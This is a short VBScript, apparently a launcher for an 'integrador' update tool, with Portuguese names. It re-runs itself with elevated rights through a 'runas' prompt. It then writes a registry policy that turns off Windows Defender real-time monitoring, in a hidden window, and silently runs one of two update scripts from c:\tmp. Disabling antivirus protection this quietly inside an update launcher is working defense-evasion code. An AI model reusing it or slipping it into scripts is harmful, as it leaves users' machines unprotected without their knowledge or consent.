If WScript.Arguments.length = 0 Then 
   Set objShell = CreateObject("Shell.Application")
   'Pass a bogus argument, say [ uac]
       objShell.ShellExecute "wscript.exe", Chr(34) & _
         WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
    Else

    DesabilitarRealTimeDefender()
    iniciar()

End If

Sub iniciar()

    Const caminhoIntegradorNovo = "c:\tmp\AtualizaIntegradorNOVO.vbs"
    Const caminhoIntegradorAntigo = "c:\tmp\AtualizarIntegradorANTIGO.vbs"
    Set shellTemporario = WScript.CreateObject("Wscript.shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    
    If objFSO.FileExists(caminhoIntegradorAntigo) = True  and objFSO.FileExists(caminhoIntegradorNovo) = False Then

        Retorno = shellTemporario.Run(caminhoIntegradorAntigo, 0 , True)

    ElseIf  objFSO.FileExists(caminhoIntegradorNovo) = true and objFSO.FileExists(caminhoIntegradorAntigo) = False Then

        Retorno = shellTemporario.Run(caminhoIntegradorNovo, 0 , True)

    End If


    WScript.Quit

End sub

Sub DesabilitarRealTimeDefender()
    Set shellTemporario = WScript.CreateObject("Wscript.shell")
    Retorno = shellTemporario.Run("REG ADD ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d 1 /f", 0, True)

End Sub


